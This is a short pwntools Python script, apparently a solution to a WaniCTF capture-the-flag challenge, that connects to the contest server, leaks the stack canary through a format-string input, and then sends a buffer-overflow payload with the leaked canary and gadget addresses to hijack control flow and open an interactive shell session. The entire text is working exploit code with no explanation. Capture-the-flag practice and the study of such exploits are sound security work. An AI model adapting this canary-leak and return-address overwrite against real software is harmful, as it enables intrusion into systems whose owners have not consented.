from pwn import *

io = remote('canaleak-pwn.wanictf.org', 9006)
#io = process('./chall')
#gdb.attach(io, api=True)

io.recvuntil(b' : ')
io.sendline(b'%9$p')
io.recvuntil(b'0x')
canary = int(io.recvline(keepends=False), 16)
print(hex(canary))
io.recvuntil(b' : ')
payload = b'i'*24 + p64(canary) + p64(0) + p64(0x000000000040101a) + p64(0x000000000040123d)
io.sendline(payload)
io.interactive()